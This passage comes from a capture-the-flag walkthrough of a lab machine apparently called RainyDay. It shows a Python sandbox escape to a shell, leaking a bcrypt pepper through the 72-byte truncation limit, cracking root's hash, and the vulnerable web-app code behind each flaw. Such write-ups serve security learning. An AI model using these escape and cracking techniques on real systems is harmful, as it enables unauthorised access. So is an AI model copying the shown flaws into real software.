'_collections._tuplegetter'&gt;, &lt;class 'collections._Link'&gt;, &lt;class 'functools.partial'&gt;, &lt;class 'functools._lru_cache_wrapper'&gt;, &lt;class 'functools.KeyWrapper'&gt;, &lt;class 'functools._lru_list_elem'&gt;, &lt;class 'functools.partialmethod'&gt;, &lt;class 'functools.singledispatchmethod'&gt;, &lt;class 'functools.cached_property'&gt;, &lt;class 'contextlib.ContextDecorator'&gt;, &lt;class 'contextlib.AsyncContextDecorator'&gt;, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;]  
</code></pre></div><p>We can find <code>&lt;class 'os._wrap_close'></code> inside the list at index 137:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ echo 'print(().__class__.__base__.__subclasses__()[137])' &gt; /tmp/a.py  
<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /tmp/a.py
&lt;class 'os._wrap_close'&gt;
</code></pre></div><p>So now, we can access <code>(...).__init__.__globals__['system']</code> and get a code execution as <code>jack_adm</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ echo '().__class__.__base__.__subclasses__()[137].__init__.__globals__["system"]("bash")' &gt; /tmp/a.py  
<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /tmp/a.py
<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">/home/jack</span>$ cd
<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ ls -la
total 20
drwxr-x--- 2 jack_adm jack_adm 4096 Sep 29 13:47 <span class="code-blue">.</span>
drwxr-xr-x 4 root     root     4096 Sep 29 13:47 <span class="code-blue">..</span>
lrwxrwxrwx 1 root     root        9 Sep 29 12:16 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>
-rw-r--r-- 1 jack_adm jack_adm  220 Jun  4 21:31 .bash_logout
-rw-r--r-- 1 jack_adm jack_adm 3771 Jun  4 21:31 .bashrc
-rw-r--r-- 1 jack_adm jack_adm  807 Jun  4 21:31 .profile
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>Basic enumeration tells us what to do next:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ sudo -l
Matching Defaults entries for jack_adm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  

User jack_adm may run the following commands on localhost:
    (root) NOPASSWD: /opt/hash_system/hash_password.py
</code></pre></div><p>Again, we can&rsquo;t read the file, not even its size:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ cat /opt/hash_system/hash_password.py
cat: /opt/hash_system/hash_password.py: Permission denied
<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ ls -lh /opt/hash_system/hash_password.py
ls: cannot access '/opt/hash_system/hash_password.py': Permission denied  
<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ ls -lh /opt/
total 8.0K
drwx--x--x 4 root root 4.0K Sep 29 13:47 <span class="code-blue">containerd</span>
drwxr-x--- 3 root root 4.0K Sep 29 13:47 <span class="code-blue">hash_system</span>
<span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ ls -lh /opt/hash_system/
ls: cannot open directory '/opt/hash_system/': Permission denied
</code></pre></div><p>The program allows us to generate hash passwords using <code>bcrypt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ sudo /opt/hash_system/hash_password.py
Enter Password&gt; asdf
[+] Hash: $2b$05$HESfZkcGQkfPhFrl/0fI8OAByhlqQ0BaZeFj1v9jJUuE.YB4l1Xiy  
</code></pre></div><p>We can notice that the program appends pepper to our password, because the hash does not match with <code>asdf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; import bcrypt
&gt;&gt;&gt; bcrypt.checkpw(b'asdf', b'$2b$05$HESfZkcGQkfPhFrl/0fI8OAByhlqQ0BaZeFj1v9jJUuE.YB4l1Xiy')  
False
</code></pre></div><p>And if we generate our own <code>bcrypt</code> hash, it is correct:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; bcrypt.hashpw(b'asdf', bcrypt.gensalt())
b'$2b$12$zlcV6l5oli1bMn67.YoHAOdOv6ltgXy2Yk3QpzKd44I.XQwcbdCt.'
&gt;&gt;&gt; bcrypt.checkpw(b'asdf', b'$2b$12$zlcV6l5oli1bMn67.YoHAOdOv6ltgXy2Yk3QpzKd44I.XQwcbdCt.')  
True
</code></pre></div><p>Therefore, the program is using <code>asdf</code> plus another string known as pepper, which is kept as a secret.</p><h3 id="finding-the-secret-pepper">Finding the secret pepper</h3><p>There is limit for passwords hashed by <code>bcrypt</code>, which is 72 bytes (more information <a href="https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length">here</a>).</p><p>But we cannot enter more than 30 characters:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ sudo /opt/hash_system/hash_password.py
Enter Password&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaa
[+] Invalid Input Length! Must be &lt;= 30
</code></pre></div><p>But we can use a trick, because we can enter <em>emoji</em>, which is less characters than bytes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; len('⚡️')
2
&gt;&gt;&gt; len('⚡️'.encode())  
6
</code></pre></div><p>So, the idea is to use <em>emoji</em> and other padding characters to reach 71 bytes, so that the 72th byte is part of the pepper. Then, with the output hash, we can use brute force to get the first byte of the pepper. After that, we can iterate reducing the padding and obtain the following pepper characters.</p><p>For that purpose, I used another Python script that connects to the machine as <code>jack</code> using SSH in <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>, pivots to user <code>jack_adm</code> and performs the attack explained before to extract the secret pepper. The script is called <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay/extract_pepper.py">extract_pepper.py</a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay#extract_pepperpy">here</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">extract_pepper.py</span>
[<span class="code-green">+</span>] Connecting to rainycloud.htb on port 22: Done
[<span class="code-blue">*</span>] jack@rainycloud.htb:
    Distro    Ubuntu 22.04
    OS:       linux
    Arch:     amd64
    Version:  5.15.0
    ASLR:     <span class="code-dark-green">Enabled</span>
[<span class="code-green">+</span>] Starting remote process bytearray(b'bash') on rainycloud.htb: pid 73184  
[<span class="code-green">+</span>] Got shell as `jack_adm`
[<span class="code-green">+</span>] Payload: ⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️⚡️A
[<span class="code-green">+</span>] Pepper: H34vyR41n
</code></pre></div><h3 id="cracking-roots-hash">Cracking <code>root</code>&rsquo;s hash</h3><p>Finally, we need to take the hashed password for <code>root</code> (from before) and perform a brute force attack using the above pepper. Again, I developed a custom script to crack the hash: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay/extract_pepper.py">crack.py</a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay#crackpy">here</a>).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">crack.py</span> $WORDLISTS/rockyou.txt <span class="code-dark-yellow">'$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W'</span> H34vyR41n  
[+] Password: b'246813579'
</code></pre></div><p>And now we can use <code>246813579H34vyR41n</code> as password and get a shell as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack_adm@rainyday</span>:<span class="code-blue">~</span>$ su root
Password:
root@rainyday:/home/jack_adm# cat /root/root.txt  
94d0f6ae36dcfa3d6d634b82716d3aeb
</code></pre></div><h2 id="clarifications">Clarifications</h2><p>Below, you can find some explanations and reasons why the above techniques worked, taking a look at the source code.</p><h3 id="api-type-juggling">API Type Juggling</h3><p>We were able to trick the API with floating values because of this code block:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">"/api/user/&lt;uid&gt;"</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">api_user</span><span class="mtk1">(</span><span class="mtk9 mtki">uid</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {}</span>
<span class="mtk1">    </span><span class="mtk3"># we've had some crashes here before so do a simpl</span><span class="mtk3">e try/except</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">u</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">User</span><span class="mtk1">.query.filter_by(</span><span class="mtk9 mtki">id</span><span class="mtk5">=</span><span class="mtk9 mtki">uid</span><span class="mtk1">).first()</span>
<span class="mtk1">        </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk1">c</span><span class="mtk1">.name: </span><span class="mtk8">getattr</span><span class="mtk1">(</span><span class="mtk1">u</span><span class="mtk1">, </span><span class="mtk1">c</span><span class="mtk1">.name) </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">u</span><span class="mtk1">.__table__.columns}</span>  

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk9 mtki">uid</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk1">session</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"id"</span><span class="mtk1">, </span><span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk6">None</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk1">response</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk4">"Error"</span><span class="mtk1">: </span><span class="mtk4">"Not allowed to view other users info!"</span><span class="mtk1">}</span>
<span class="mtk1">    </span><span class="mtk5">except</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">pass</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">response</span>
</code></pre></div><p>Using floating point numbers, we cause an exception, so the results are returned. The <code>id</code> variable is treated as a value in the database, no matter the type; but it matters for Python interpreter:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; int('1.0')
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
ValueError: invalid literal for int() with base 10: '1.0'  
</code></pre></div><h3 id="user-enumeration-1">User enumeration</h3><p>The process of enumerating users was possible because the server first checks that the username exists and then verifies the password, and it throws two different error messages:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">"/login"</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">"GET"</span><span class="mtk1">, </span><span class="mtk4">"POST"</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">login</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">method</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"GET"</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">"login.html"</span><span class="mtk1">, </span><span class="mtk9 mtki">dev</span><span class="mtk5">=</span><span class="mtk1">g</span><span class="mtk1">.dev)</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"username"</span><span class="mtk1">, </span><span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk6">None</span><span class="mtk1">, </span><span class="mtk9 mtki">type</span><span class="mtk5">=</span><span class="mtk8 mtku">str</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"password"</span><span class="mtk1">, </span><span class="mtk9 mtki">default</span><span class="mtk5">=</span><span class="mtk6">None</span><span class="mtk1">, </span><span class="mtk9 mtki">type</span><span class="mtk5">=</span><span class="mtk8 mtku">str</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">is</span><span class="mtk1"> </span><span class="mtk6">None</span><span class="mtk1"> </span><span class="mtk5">or</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">is</span><span class="mtk1"> </span><span class="mtk6">None</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">"login.html"</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk4">"Missing Parameter!"</span><span class="mtk1">, </span><span class="mtk9 mtki">error_specific</span><span class="mtk5">=</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">filename</span><span class="mtk6">}</span><span class="mtk4">:</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">lineno</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk9 mtki">dev</span><span class="mtk5">=</span><span class="mtk1">g</span><span class="mtk1">.dev)</span>
<span class="mtk1">        </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">u</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">User</span><span class="mtk1">.query.filter_by(</span><span class="mtk9 mtki">username</span><span class="mtk5">=</span><span class="mtk1">username</span><span class="mtk1">).first()</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">u</span><span class="mtk1"> </span><span class="mtk5">is</span><span class="mtk1"> </span><span class="mtk6">None</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">"login.html"</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk4">"Login Incorrect!"</span><span class="mtk1">, </span><span class="mtk9 mtki">error_specific</span><span class="mtk5">=</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">filename</span><span class="mtk6">}</span><span class="mtk4">:</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">lineno</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk9 mtki">dev</span><span class="mtk5">=</span><span class="mtk1">g</span><span class="mtk1">.dev)</span>
<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8 mtku">bcrypt</span><span class="mtk1">.</span><span class="mtk8">checkpw</span><span class="mtk1">(</span><span class="mtk1">password</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">(), </span><span class="mtk1">u</span><span class="mtk1">.password.encode()):</span>
<span class="mtk1">                    </span><span class="mtk1">session</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">username</span>
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk8">url_for</span><span class="mtk1">(</span><span class="mtk4">"index"</span><span class="mtk1">))</span>
<span class="mtk1">                </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">"login.html"</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk4">"Login Incorrect!"</span><span class="mtk1">, </span><span class="mtk9 mtki">error_specific</span><span class="mtk5">=</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">filename</span><span class="mtk6">}</span><span class="mtk4">:</span><span class="mtk6">{</span><span class="mtk8">getframeinfo</span><span class="mtk1">(</span><span class="mtk8">currentframe</span><span class="mtk1">()).</span><span class="mtk1">lineno</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk9 mtki">dev</span><span class="mtk5">=</span><span class="mtk1">g</span><span class="mtk1">.dev)</span>  
</code></pre></div><h3 id="process-inspection-from-the-containers">Process inspection from the containers</h3><p>I guess that the intended way is to access <code>jack</code>&rsquo;s container, read the hint and then read the machine&rsquo;s filesystem from the container using <code>/proc</code>. Actually, this is also possible from <code>gary</code>&rsquo;s container in detached mode, because the UID is 1000, the same as the running process that granted access to the filesystem. Maybe the developer forgot to add it:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">                </span><span class="mtk5">elif</span><span class="mtk1"> </span><span class="mtk1">action</span><span class="mtk1">.</span><span class="mtk8">startswith</span><span class="mtk1">(</span><span class="mtk4">"execdetach"</span><span class="mtk1">):</span>
<span class="mtk1">                    </span><span class="mtk1">action_cmd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">action</span><span class="mtk1">[</span><span class="mtk6">10</span><span class="mtk1">:]</span>
<span class="mtk1">                    </span><span class="mtk1">exit_code</span><span class="mtk1">, </span><span class="mtk1">output</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">container</span><span class="mtk1">.exec_run(</span><span class="mtk1">action_cmd</span><span class="mtk1">, </span><span class="mtk9 mtki">detach</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">, </span><span class="mtk9 mtki">privileged</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">, </span><span class="mtk9 mtki">user</span><span class="mtk5">=</span><span class="mtk4">"1000:1000"</span><span class="mtk1">)</span>
<span class="mtk1">                </span><span class="mtk5">elif</span><span class="mtk1"> </span><span class="mtk1">action</span><span class="mtk1">.</span><span class="mtk8">startswith</span><span class="mtk1">(</span><span class="mtk4">"exec"</span><span class="mtk1">):</span>
<span class="mtk1">                    </span><span class="mtk1">action_cmd</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">action</span><span class="mtk1">[</span><span class="mtk6">4</span><span class="mtk1">:]</span>
<span class="mtk1">                    </span><span class="mtk1">exit_code</span><span class="mtk1">, </span><span class="mtk1">output</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">container</span><span class="mtk1">.exec_run(</span><span class="mtk4">"timeout 5s "</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">action_cmd</span><span class="mtk1">, </span><span class="mtk9 mtki">privileged</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">, </span><span class="mtk9 mtki">user</span><span class="mtk5">=</span><span class="mtk4">"1000:1000"</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">session</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"jack"</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk4">"1337:1337"</span><span class="mtk1">)</span>  
<span class="mtk1">                    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">Response</span><span class="mtk1">(</span><span class="mtk1">output</span><span class="mtk1">, </span><span class="mtk9 mtki">mimetype</span><span class="mtk5">=</span><span class="mtk4">"text/plain"</span><span class="mtk1">, </span><span class="mtk9 mtki">headers</span><span class="mtk5">=</span><span class="mtk1">{</span><span class="mtk4">"Content-Disposition"</span><span class="mtk1">: </span><span class="mtk4">"attachment; filename=command_output.txt"</span><span class="mtk1">})</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"Success"</span>
</code></pre></div><h3 id="ip-address-validation">IP address validation</h3><p>The code uses a header <code>X-Real-IP</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">ValidateIP</span><span class="mtk1">(</span><span class="mtk9 mtki">ip</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">ip</span><span class="mtk1">.startswith(</span><span class="mtk4">"10."</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">ip</span><span class="mtk1">.startswith(</span><span class="mtk4">"172."</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">True</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">ip</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"127.0.0.1"</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">True</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">False</span>

<span class="mtk3"># APP CODE</span>
<span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">before_request</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">before</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">o</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">urlparse</span><span class="mtk1">(</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">base_url</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">ip</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">remote_addr</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk4">"X-Real-IP"</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">headers</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">headers</span><span class="mtk1">[</span><span class="mtk4">'X-Real-IP'</span><span class="mtk1">]</span>  
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"[before] </span><span class="mtk6">{</span><span class="mtk1">o</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"[before] </span><span class="mtk6">{</span><span class="mtk1">ip</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">o</span><span class="mtk1">.</span><span class="mtk1">hostname</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> [</span><span class="mtk4">"dev.rainycloud.htb"</span><span class="mtk1">, </span><span class="mtk4">"rainycloud.htb"</span><span class="mtk1">]:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk4 detected-link">http://rainycloud.htb</span><span class="mtk4">"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">g</span><span class="mtk1">.dev </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">True</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">o</span><span class="mtk1">.</span><span class="mtk1">hostname</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"dev.rainycloud.htb"</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk6">False</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk8">ValidateIP</span><span class="mtk1">(</span><span class="mtk1">ip</span><span class="mtk1">) </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk1">g</span><span class="mtk1">.dev:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"Access Denied - Invalid IP"</span><span class="mtk1">, </span><span class="mtk6">403</span>
